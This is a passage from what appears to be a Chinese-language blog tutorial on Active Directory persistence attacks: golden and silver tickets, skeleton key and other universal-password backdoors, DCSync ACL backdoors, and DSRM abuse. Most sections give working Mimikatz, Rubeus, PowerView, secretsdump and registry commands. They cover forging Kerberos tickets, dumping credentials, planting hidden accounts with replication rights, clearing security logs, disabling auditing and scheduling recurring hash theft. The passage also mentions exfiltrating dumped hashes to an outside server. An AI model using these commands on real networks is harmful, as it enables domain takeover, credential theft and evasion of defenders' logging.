<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用 Mimikatz（RC4 加密）</span></span><br><span class="line">mimikatz <span class="string">&quot;kerberos::golden /user:Administrator /domain:example.com /sid:S-1-5-21-... /krbtgt:&lt;krbtgt_hash&gt; /ptt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 AES-256 密钥（更隐蔽）</span></span><br><span class="line">mimikatz <span class="string">&quot;kerberos::golden /user:Administrator /domain:example.com /sid:S-1-5-21-... /aes256:&lt;aes_key&gt; /ptt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Rubeus 生成（需指定结束时间）</span></span><br><span class="line">Rubeus.exe golden /rc4:&lt;krbtgt_hash&gt; /domain:example.com /sid:S-1-5-21-... /user:Administrator /ptt</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>关键参数</strong>：  <ul>
<li><code>/user</code>：伪造的用户名（通常为 Administrator）。  </li>
<li><code>/domain</code>：域名。  </li>
<li><code>/sid</code>：域的 SID（可通过 <code>whoami /all</code> 获取）。  </li>
<li><code>/ptt</code>：将票据注入当前会话内存（Pass-the-Ticket）。</li>
</ul>
</li>
</ul>
<h4 id="步骤-3：权限验证与利用"><a href="#步骤-3：权限验证与利用" class="headerlink" title="步骤 3：权限验证与利用"></a><strong>步骤 3：权限验证与利用</strong></h4><ul>
<li><strong>访问域控资源</strong>：  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">dir</span> \\dc.example.com\C$  <span class="comment"># 验证文件访问权限</span></span><br></pre></td></tr></table></figure></li>
<li><strong>执行 DCSync</strong>：  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz <span class="string">&quot;lsadump::dcsync /domain:example.com /user:krbtgt&quot;</span></span><br></pre></td></tr></table></figure></li>
<li><strong>远程命令执行</strong>：<br>使用 PsExec 或 WMI 获取域控 Shell：  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PsExec.exe \\dc.example.com cmd.exe</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h3 id="四、技术原理深度解析"><a href="#四、技术原理深度解析" class="headerlink" title="四、技术原理深度解析"></a><strong>四、技术原理深度解析</strong></h3><ol>
<li><strong>TGT 的结构与签名</strong>：<br>TGT 包含用户身份、组 SID、有效期等信息，并由 <code>krbtgt</code> 的密钥签名。黄金票据通过伪造签名，使 KDC 误认为其合法。  </li>
<li><strong>PAC（特权属性证书）的绕过</strong>：<br>黄金票据可选择性包含 PAC，但若域启用 PAC 签名强校验（如仅允许 AES 加密），需确保 PAC 的正确签名。  </li>
<li><strong>Kerberos 协议信任链</strong>：<br>KDC 无法验证自签名的 TGT，默认信任其合法性，这是黄金票据攻击的根源。</li>
</ol>
<h2 id="2-白银票据（Silver-Ticket）"><a href="#2-白银票据（Silver-Ticket）" class="headerlink" title="2.白银票据（Silver Ticket）"></a>2.白银票据（Silver Ticket）</h2><hr>
<h4 id="一、白银票据的核心原理"><a href="#一、白银票据的核心原理" class="headerlink" title="一、白银票据的核心原理"></a><strong>一、白银票据的核心原理</strong></h4><p><strong>白银票据（Silver Ticket）</strong> 是一种基于 Kerberos 协议的服务票据伪造攻击，通过窃取服务账户（如 <strong>CIFS</strong>、<strong>LDAP</strong>、<strong>HTTP</strong> 等）的 <strong>NTLM Hash</strong> 或 <strong>AES Key</strong>，伪造特定服务的 <strong>ST（服务票据）</strong>，绕过 TGT（票据授予票据）验证，直接访问目标服务。其核心逻辑如下：  </p>
<ol>
<li><strong>ST 的生成机制</strong>：<br>Kerberos 协议中，服务票据（ST）由 KDC（密钥分发中心）使用服务账户的密钥加密。攻击者获取该密钥后，可自主生成 ST，无需与 KDC 交互。  </li>
<li><strong>绕过 KDC 验证</strong>：<br>白银票据直接使用服务账户的密钥加密伪造的 ST，目标服务无法区分其合法性，默认信任该票据。  </li>
<li><strong>精准攻击</strong>：<br>白银票据仅对特定服务有效（如 <code>CIFS/DC01</code>），攻击范围有限，但隐蔽性更高（无 KDC 交互记录）。</li>
</ol>
<hr>
<h4 id="二、攻击前提条件-1"><a href="#二、攻击前提条件-1" class="headerlink" title="二、攻击前提条件"></a><strong>二、攻击前提条件</strong></h4><ol>
<li><strong>关键凭据</strong>：  <ul>
<li><strong>服务账户的 NTLM Hash 或 AES Key</strong>（通过 Kerberoasting、密码破解或内存提取获取）。  </li>
<li><strong>目标服务的 SPN（Service Principal Name）</strong>（如 <code>CIFS/DC01.example.com</code>）。</li>
</ul>
</li>
<li><strong>环境要求</strong>：  <ul>
<li>攻击者已控制域内一台主机，能够与目标服务通信（如 445&#x2F;SMB 端口）。  </li>
<li>目标服务未启用强加密验证（如 SMB 签名或 LDAP 加密）。</li>
</ul>
</li>
</ol>
<hr>
<h4 id="三、白银票据生成与利用流程"><a href="#三、白银票据生成与利用流程" class="headerlink" title="三、白银票据生成与利用流程"></a><strong>三、白银票据生成与利用流程</strong></h4><h5 id="步骤-1：获取服务账户的凭据"><a href="#步骤-1：获取服务账户的凭据" class="headerlink" title="步骤 1：获取服务账户的凭据"></a><strong>步骤 1：获取服务账户的凭据</strong></h5><ul>
<li><p><strong>Kerberoasting 攻击</strong>：<br>请求高权限服务的 ST 并离线破解：  </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用 Rubeus 请求 ST</span></span><br><span class="line">Rubeus.exe kerberoast /user:svc_sql /nowrap</span><br><span class="line"><span class="comment"># 使用 Hashcat 破解（示例）</span></span><br><span class="line">hashcat -m 13100 hash.txt rockyou.txt</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>内存提取</strong>：<br>若已控制运行服务的主机，使用 Mimikatz 提取服务账户凭据：  </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;sekurlsa::logonpasswords&quot;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h5 id="步骤-2：生成白银票据"><a href="#步骤-2：生成白银票据" class="headerlink" title="步骤 2：生成白银票据"></a><strong>步骤 2：生成白银票据</strong></h5><p>使用 <strong>Mimikatz</strong> 或 <strong>Rubeus</strong> 生成伪造的 ST：  </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用 Mimikatz（伪造 CIFS 服务票据）</span></span><br><span class="line">mimikatz <span class="string">&quot;kerberos::golden /user:Administrator /domain:example.com /sid:S-1-5-21-... /target:DC01.example.com /service:CIFS /rc4:&lt;service_hash&gt; /ptt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 AES-256 密钥（更隐蔽）</span></span><br><span class="line">mimikatz <span class="string">&quot;kerberos::golden /user:Administrator /domain:example.com /sid:S-1-5-21-... /target:DC01.example.com /service:CIFS /aes256:&lt;aes_key&gt; /ptt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Rubeus 生成（需指定 SPN 和用户）</span></span><br><span class="line">Rubeus.exe silver /service:CIFS/DC01.example.com /user:Administrator /rc4:&lt;service_hash&gt; /ptt</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>关键参数</strong>：  <ul>
<li><code>/user</code>：伪造的用户名（如 Administrator）。  </li>
<li><code>/domain</code>：域名。  </li>
<li><code>/sid</code>：域的 SID（通过 <code>whoami /all</code> 获取）。  </li>
<li><code>/service</code>：目标服务的 SPN（必须与目标服务匹配）。  </li>
<li><code>/ptt</code>：将票据注入当前会话内存（Pass-the-Ticket）。</li>
</ul>
</li>
</ul>
<h5 id="步骤-3：权限验证与利用-1"><a href="#步骤-3：权限验证与利用-1" class="headerlink" title="步骤 3：权限验证与利用"></a><strong>步骤 3：权限验证与利用</strong></h5><ul>
<li><p><strong>访问目标服务资源</strong>：  </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">dir</span> \\DC01.example.com\C$  <span class="comment"># 验证文件共享访问权限</span></span><br></pre></td></tr></table></figure></li>
<li><p><strong>执行远程命令</strong>：  </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PsExec.exe \\DC01.example.com cmd.exe</span><br></pre></td></tr></table></figure></li>
<li><p><strong>DCSync 攻击（需 LDAP 服务票据）</strong>：  </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz <span class="string">&quot;lsadump::dcsync /domain:example.com /user:krbtgt&quot;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h4 id="四、技术原理深度解析-1"><a href="#四、技术原理深度解析-1" class="headerlink" title="四、技术原理深度解析"></a><strong>四、技术原理深度解析</strong></h4><ol>
<li><strong>ST 的结构与签名</strong>：<br>ST 包含用户身份、服务 SPN、有效期等信息，并由服务账户的密钥签名。白银票据通过伪造签名，使目标服务误认为其合法。  </li>
<li><strong>PAC（特权属性证书）的缺失</strong>：<br>白银票据通常不包含 PAC（或包含无效 PAC），因此依赖目标服务是否强制校验 PAC。若服务不校验 PAC，攻击者可绕过权限验证。  </li>
<li><strong>无需 KDC 交互</strong>：<br>白银票据直接生成并发送至目标服务，不经过 KDC，因此无 Event ID 4768（TGT 请求）日志记录，隐蔽性更高。</li>
</ol>
<hr>
<h4 id="五、白银票据-vs-黄金票据"><a href="#五、白银票据-vs-黄金票据" class="headerlink" title="五、白银票据 vs. 黄金票据"></a><strong>五、白银票据 vs. 黄金票据</strong></h4><table>
<thead>
<tr>
<th><strong>特性</strong></th>
<th><strong>白银票据（Silver Ticket）</strong></th>
<th><strong>黄金票据（Golden Ticket）</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>依赖密钥</strong></td>
<td>服务账户的 NTLM Hash&#x2F;AES Key</td>
<td><code>krbtgt</code> 的 NTLM Hash&#x2F;AES Key</td>
</tr>
<tr>
<td><strong>攻击范围</strong></td>
<td>仅限特定服务（如 CIFS、LDAP、HTTP）</td>
<td>全域（可访问任何服务）</td>
</tr>
<tr>
<td><strong>是否需要 TGT</strong></td>
<td>无需（直接生成 ST）</td>
<td>无需（直接生成 TGT）</td>
</tr>
<tr>
<td><strong>隐蔽性</strong></td>
<td>高（无 KDC 交互日志）</td>
<td>较高（TGT 请求日志可能异常）</td>
</tr>
<tr>
<td><strong>防御难度</strong></td>
<td>中（需轮换服务账户密码）</td>
<td>高（需重置 <code>krbtgt</code> 密码）</td>
</tr>
</tbody></table>
<h2 id="3-万能密码"><a href="#3-万能密码" class="headerlink" title="3.万能密码"></a>3.万能密码</h2><hr>
<h3 id="一、万能密码的核心概念"><a href="#一、万能密码的核心概念" class="headerlink" title="一、万能密码的核心概念"></a><strong>一、万能密码的核心概念</strong></h3><p><strong>万能密码</strong> 是一种特殊的权限维持技术，通过在域控中植入后门，使得攻击者使用<strong>预设的通用密码</strong>即可通过任意用户账户的身份验证（如域管理员）。该技术不修改用户实际密码，而是篡改身份验证流程，绕过正常密码校验逻辑。其核心特点包括：</p>
<ul>
<li><strong>隐蔽性</strong>：不影响用户正常登录，仅在攻击者使用特定密码时触发后门。</li>
<li><strong>持久性</strong>：通常依赖内存注入或系统级Hook，需结合持久化机制防止重启失效。</li>
<li><strong>高权限要求</strong>：需域管理员或SYSTEM权限部署后门。</li>
</ul>
<hr>
<h3 id="二、技术实现方式"><a href="#二、技术实现方式" class="headerlink" title="二、技术实现方式"></a><strong>二、技术实现方式</strong></h3><h4 id="1-Skeleton-Key（骨架密钥）"><a href="#1-Skeleton-Key（骨架密钥）" class="headerlink" title="1. Skeleton Key（骨架密钥）"></a><strong>1. Skeleton Key（骨架密钥）</strong></h4><p><strong>原理</strong>：<br>由Mimikatz提出的内存级后门，通过Hook LSASS进程的<code>msv1_0.dll</code>或<code>kerberos.dll</code>中的密码验证函数，为所有用户添加一个<strong>通用密码</strong>（如<code>mimikatz</code>）。<br><strong>操作步骤</strong>：  </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 注入Skeleton Key到LSASS（需管理员权限）</span></span><br><span class="line">mimikatz <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;misc::skeleton&quot;</span></span><br></pre></td></tr></table></figure>
<p><strong>特点</strong>：  </p>
<ul>
<li><strong>无需修改用户密码</strong>：原始密码仍有效，攻击者使用通用密码即可登录。  </li>
<li><strong>重启失效</strong>：LSASS进程重启后后门消失。  </li>
<li><strong>仅影响当前域控</strong>：多域控环境下需在所有DC上部署。</li>
</ul>
<p><strong>持久化</strong>：  </p>
<ul>
<li>结合<strong>计划任务</strong>或<strong>WMI事件订阅</strong>，在系统启动时重新注入Skeleton Key。  </li>
<li>使用工具（如<strong>Metasploit</strong>的<code>persistence</code>模块）创建自启动服务。</li>
</ul>
<hr>
<h4 id="2-恶意安全支持提供者（SSP）"><a href="#2-恶意安全支持提供者（SSP）" class="headerlink" title="2. 恶意安全支持提供者（SSP）"></a><strong>2. 恶意安全支持提供者（SSP）</strong></h4><p><strong>原理</strong>：<br>通过注册恶意SSP（Security Support Provider）DLL，截获并篡改身份验证请求。<br><strong>操作步骤</strong>：  </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用Mimikatz安装恶意SSP（如mimilib.dll）</span></span><br><span class="line">mimikatz <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;misc::memssp&quot;</span></span><br></pre></td></tr></table></figure>
<p><strong>特点</strong>：  </p>
<ul>
<li><strong>记录或篡改凭据</strong>：可记录所有用户密码或允许特定密码通过验证。  </li>
<li><strong>重启持久</strong>：SSP注册表项（<code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages</code>）确保DLL在重启后加载。</li>
</ul>
<p><strong>持久化</strong>：  </p>
<ul>
<li>将恶意DLL写入<code>%SystemRoot%\System32</code>并注册为SSP。  </li>
<li>通过<strong>组策略</strong>强制所有域控加载该SSP。</li>
</ul>
<hr>
<h4 id="3-密码筛选器后门（Password-Filter-DLL）"><a href="#3-密码筛选器后门（Password-Filter-DLL）" class="headerlink" title="3. 密码筛选器后门（Password Filter DLL）"></a><strong>3. 密码筛选器后门（Password Filter DLL）</strong></h4><p><strong>原理</strong>：<br>利用Windows密码策略机制，注册恶意密码筛选器DLL，在密码修改或验证时触发后门逻辑。<br><strong>操作步骤</strong>：  </p>
<ol>
<li><strong>编写恶意DLL</strong>：实现<code>PasswordFilter</code>函数，检查输入密码是否为预设值（如<code>Backdoor@123</code>），若匹配则返回验证通过。  </li>
<li><strong>注册DLL</strong>：  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 修改注册表</span></span><br><span class="line">reg add <span class="string">&quot;HKLM\SYSTEM\CurrentControlSet\Control\Lsa&quot;</span> /v <span class="string">&quot;Notification Packages&quot;</span> /t REG_MULTI_SZ /d <span class="string">&quot;evildll&quot;</span> /f</span><br></pre></td></tr></table></figure></li>
<li><strong>重启生效</strong>：需重启系统或LSASS进程。</li>
</ol>
<p><strong>特点</strong>：  </p>
<ul>
<li><strong>深度隐蔽</strong>：与系统密码策略集成，难以被常规审计发现。  </li>
<li><strong>全局生效</strong>：影响所有用户密码验证流程。</li>
</ul>
<p><strong>持久化</strong>：  </p>
<ul>
<li>将DLL复制到<code>System32</code>目录并锁定权限防止删除。  </li>
<li>禁用Windows文件保护（WFPC）或利用驱动程序绕过签名校验。</li>
</ul>
<hr>
<h4 id="4-修改NTDS-dit数据库"><a href="#4-修改NTDS-dit数据库" class="headerlink" title="4. 修改NTDS.dit数据库"></a><strong>4. 修改NTDS.dit数据库</strong></h4><p><strong>原理</strong>：<br>直接修改域控的<code>NTDS.dit</code>数据库，为所有用户账户添加相同的备用密码哈希（LM&#x2F;NTLM）。<br><strong>操作步骤</strong>：  </p>
<ol>
<li><strong>获取数据库访问权限</strong>：通过Volume Shadow Copy或直接复制<code>NTDS.dit</code>和<code>SYSTEM</code>注册表文件。  </li>
<li><strong>离线注入哈希</strong>：使用工具（如<strong>secretsdump.py</strong>和<strong>nthash.py</strong>）批量修改用户哈希。  </li>
<li><strong>恢复数据库</strong>：替换原始文件并重启域控。</li>
</ol>
<p><strong>特点</strong>：  </p>
<ul>
<li><strong>高风险</strong>：操作不当易导致数据库损坏。  </li>
<li><strong>高隐蔽性</strong>：用户正常密码不变，仅攻击者知晓备用哈希。</li>
</ul>
<p><strong>持久化</strong>：  </p>
<ul>
<li>定期同步更新备用哈希以匹配密码策略。  </li>
<li>结合ACL后门防止数据库文件被审计。</li>
</ul>
<hr>
<h2 id="4-DCSync-后门"><a href="#4-DCSync-后门" class="headerlink" title="4.DCSync 后门"></a>4.DCSync 后门</h2><hr>
<p><strong>DCSync</strong> 是一种通过模拟域控制器（DC）的复制行为，利用 <strong>目录复制服务（DRS）协议</strong> 获取域内所有用户密码哈希的技术。攻击者通过为普通用户或隐藏账户授予 <strong>复制目录更改（Replicating Directory Changes All）</strong> 权限，使其具备类似域控制器的数据同步能力，从而实现持久化权限维持。</p>
<hr>
<h3 id="二、攻击流程"><a href="#二、攻击流程" class="headerlink" title="二、攻击流程"></a><strong>二、攻击流程</strong></h3><h4 id="1-授予DCSync权限"><a href="#1-授予DCSync权限" class="headerlink" title="1. 授予DCSync权限"></a><strong>1. 授予DCSync权限</strong></h4><p>通过修改目标用户或计算机账户的ACL（访问控制列表），添加 <strong>DS-Replication-Get-Changes-All</strong> 权限。</p>
<p><strong>PowerShell (PowerView) 示例</strong>：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 导入PowerView模块</span></span><br><span class="line"><span class="built_in">Import-Module</span> .\PowerView.ps1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 授予用户 &quot;BackdoorUser&quot; DCSync权限</span></span><br><span class="line"><span class="built_in">Add-DomainObjectAcl</span> <span class="literal">-TargetDistinguishedName</span> <span class="string">&quot;DC=example,DC=com&quot;</span> <span class="literal">-PrincipalIdentity</span> BackdoorUser <span class="literal">-Rights</span> DCSync</span><br><span class="line"></span><br><span class="line"><span class="comment"># 验证权限是否添加成功</span></span><br><span class="line"><span class="built_in">Get-DomainObjectAcl</span> <span class="literal">-Identity</span> <span class="string">&quot;DC=example,DC=com&quot;</span> | ? &#123; <span class="variable">$_</span>.SecurityIdentifier <span class="operator">-eq</span> (<span class="built_in">Get-DomainUser</span> BackdoorUser).SID &#125;</span><br></pre></td></tr></table></figure>

<p><strong>dsacls 命令行工具示例</strong>：</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dsacls &quot;DC=example,DC=com&quot; /G &quot;EXAMPLE\BackdoorUser:CA;Replicating Directory Changes All&quot;</span><br></pre></td></tr></table></figure>

<h4 id="2-创建隐蔽账户（可选）"><a href="#2-创建隐蔽账户（可选）" class="headerlink" title="2. 创建隐蔽账户（可选）"></a><strong>2. 创建隐蔽账户（可选）</strong></h4><p>创建不易被发现的隐藏账户，如 <strong>影子账户</strong> 或 <strong>机器账户</strong>：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建隐藏用户（设置不可逆密码）</span></span><br><span class="line"><span class="built_in">New-ADUser</span> <span class="literal">-Name</span> <span class="string">&quot;svc_backup&quot;</span> <span class="literal">-AccountPassword</span> (<span class="built_in">ConvertTo-SecureString</span> <span class="string">&quot;P@ssw0rd!&quot;</span> <span class="literal">-AsPlainText</span> <span class="literal">-Force</span>) <span class="literal">-Enabled</span> <span class="variable">$true</span> <span class="literal">-PasswordNeverExpires</span> <span class="variable">$true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将用户添加到低权限组（如 &quot;Domain Users&quot;），避免引起注意</span></span><br><span class="line"><span class="built_in">Add-ADGroupMember</span> <span class="literal">-Identity</span> <span class="string">&quot;Domain Users&quot;</span> <span class="literal">-Members</span> svc_backup</span><br></pre></td></tr></table></figure>

<h4 id="3-执行DCSync导出哈希"><a href="#3-执行DCSync导出哈希" class="headerlink" title="3. 执行DCSync导出哈希"></a><strong>3. 执行DCSync导出哈希</strong></h4><p>使用 <strong>Mimikatz</strong> 或 <strong>Impacket</strong> 导出域内哈希：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Mimikatz</span></span><br><span class="line">mimikatz <span class="string">&quot;lsadump::dcsync /domain:example.com /user:krbtgt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Impacket (secretsdump.py)</span></span><br><span class="line">secretsdump.py example.com/BackdoorUser@dc.example.com -just-dc</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="三、权限维持与隐蔽手段"><a href="#三、权限维持与隐蔽手段" class="headerlink" title="三、权限维持与隐蔽手段"></a><strong>三、权限维持与隐蔽手段</strong></h3><h4 id="1-ACL隐藏技术"><a href="#1-ACL隐藏技术" class="headerlink" title="1. ACL隐藏技术"></a><strong>1. ACL隐藏技术</strong></h4><ul>
<li><strong>继承禁用</strong>：<br>修改ACL继承设置，使权限条目不通过常规工具（如Active Directory用户和计算机）显示。<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-ADObject</span> <span class="literal">-Identity</span> <span class="string">&quot;DC=example,DC=com&quot;</span> <span class="operator">-Replace</span> <span class="selector-tag">@</span>&#123;nTSecurityDescriptor = (<span class="built_in">Get-ADObject</span> <span class="literal">-Identity</span> <span class="string">&quot;DC=example,DC=com&quot;</span> <span class="literal">-Properties</span> nTSecurityDescriptor).nTSecurityDescriptor&#125;</span><br></pre></td></tr></table></figure></li>
<li><strong>混淆安全标识符（SID）</strong>：<br>使用 <strong>SID History注入</strong> 或 <strong>跨域信任关系</strong> 隐藏真实权限来源。</li>
</ul>
<h4 id="2-日志绕过"><a href="#2-日志绕过" class="headerlink" title="2. 日志绕过"></a><strong>2. 日志绕过</strong></h4><ul>
<li><strong>清除事件日志</strong>：<br>使用 <strong>wevtutil</strong> 删除相关事件记录：<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wevtutil cl Security  # 清除安全日志</span><br></pre></td></tr></table></figure></li>
<li><strong>禁用日志记录</strong>：<br>修改组策略关闭敏感操作审计（需管理员权限）：<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-GPOAuditPolicy</span> <span class="literal">-Path</span> <span class="string">&quot;DC=example,DC=com&quot;</span> <span class="literal">-Category</span> <span class="string">&quot;DS Access&quot;</span> <span class="literal">-AuditType</span> <span class="string">&quot;None&quot;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="3-定期同步与自动化"><a href="#3-定期同步与自动化" class="headerlink" title="3. 定期同步与自动化"></a><strong>3. 定期同步与自动化</strong></h4><ul>
<li><strong>计划任务触发DCSync</strong>：<br>通过域控或受控主机定时执行哈希导出：<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /create /tn &quot;DCSyncTask&quot; /tr &quot;C:\tools\mimikatz.exe \&quot;lsadump::dcsync\&quot; /domain:example.com&quot; /sc weekly /ru SYSTEM</span><br></pre></td></tr></table></figure></li>
<li><strong>邮件或外传通道</strong>：<br>将导出的哈希自动发送至外部服务器（如HTTPS API或邮件）。</li>
</ul>
<hr>
<h2 id="5-DSRM"><a href="#5-DSRM" class="headerlink" title="5.DSRM"></a>5.DSRM</h2><hr>
<h3 id="一、DSRM-的核心作用"><a href="#一、DSRM-的核心作用" class="headerlink" title="一、DSRM 的核心作用"></a><strong>一、DSRM 的核心作用</strong></h3><p><strong>DSRM（Directory Services Restore Mode）</strong> 是 Windows 域控制器的安全修复模式，用于在 Active Directory 数据库（<code>ntds.dit</code>）损坏时执行还原操作。其本地管理员账户（<code>.\Administrator</code>）的密码独立于域账户体系，成为攻击者隐蔽权限维持的理想后门。</p>
<hr>
<h3 id="二、DSRM-权限持久化原理"><a href="#二、DSRM-权限持久化原理" class="headerlink" title="二、DSRM 权限持久化原理"></a><strong>二、DSRM 权限持久化原理</strong></h3><ol>
<li><strong>密码独立性</strong>：<br>DSRM 密码在域控安装时设置，与域管理员密码无关，且默认不会自动同步。即使域管理员密码被重置，DSRM 密码仍有效。  </li>
<li><strong>本地特权</strong>：<br>DSRM 账户拥有本地 <code>SYSTEM</code> 权限，可绕过域策略直接访问域控文件系统（如提取 <code>ntds.dit</code>）。  </li>
<li><strong>隐蔽性</strong>：<br>DSRM 登录行为通常不会触发域日志（如 Event ID 4624），仅记录在本地安全日志中，难以被集中监控。</li>
</ol>
<hr>
<h3 id="三、攻击流程"><a href="#三、攻击流程" class="headerlink" title="三、攻击流程"></a><strong>三、攻击流程</strong></h3><h4 id="1-获取当前-DSRM-密码"><a href="#1-获取当前-DSRM-密码" class="headerlink" title="1. 获取当前 DSRM 密码"></a><strong>1. 获取当前 DSRM 密码</strong></h4><ul>
<li><strong>从 ntds.dit 中提取</strong>（需域控权限）：  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用 Mimikatz 提取 DSRM 账户信息</span></span><br><span class="line">mimikatz <span class="string">&quot;lsadump::lsa /name:Administrator /id:500&quot;</span>  <span class="comment"># 查找 RID 为 500 的本地账户</span></span><br></pre></td></tr></table></figure></li>
<li><strong>通过注册表查询</strong>：  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query <span class="string">&quot;HKLM\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA&quot;</span> /v DsrmAdminLogonBehavior</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="2-修改-DSRM-密码"><a href="#2-修改-DSRM-密码" class="headerlink" title="2. 修改 DSRM 密码"></a><strong>2. 修改 DSRM 密码</strong></h4><ul>
<li><strong>使用 ntdsutil 工具</strong>：  <figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil</span><br><span class="line"><span class="built_in">set</span> DSRM password</span><br><span class="line">reset password on server &lt;域控主机名&gt;</span><br><span class="line">&lt;输入新密码&gt;</span><br><span class="line">q</span><br><span class="line">q</span><br></pre></td></tr></table></figure></li>
<li><strong>通过 PowerShell 脚本</strong>：  <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-ADDBAccountPassword</span> <span class="literal">-SamAccountName</span> Administrator <span class="literal">-NewPassword</span> (<span class="built_in">ConvertTo-SecureString</span> <span class="string">&quot;NewPassw0rd!&quot;</span> <span class="literal">-AsPlainText</span> <span class="literal">-Force</span>) <span class="literal">-DatabasePath</span> <span class="string">&quot;C:\Windows\NTDS\ntds.dit&quot;</span> <span class="literal">-SysvolPath</span> <span class="string">&quot;C:\Windows\SYSVOL&quot;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="3-启用-DSRM-登录"><a href="#3-启用-DSRM-登录" class="headerlink" title="3. 启用 DSRM 登录"></a><strong>3. 启用 DSRM 登录</strong></h4><p>默认情况下，DSRM 仅能在<strong>安全启动模式</strong>下使用。需修改注册表允许在正常模式登录：  </p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add &quot;HKLM\SYSTEM\CurrentControlSet\Control\Lsa&quot; /v DsrmAdminLogonBehavior /t REG_DWORD /d <span class="number">2</span> /f</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>值说明</strong>：  <ul>
<li><code>0</code>：仅在安全启动模式允许 DSRM 登录。  </li>
<li><code>1</code>：禁止 DSRM 登录。  </li>
<li><code>2</code>：允许在域控正常运行时使用 DSRM 登录。</li>
</ul>
</li>
</ul>
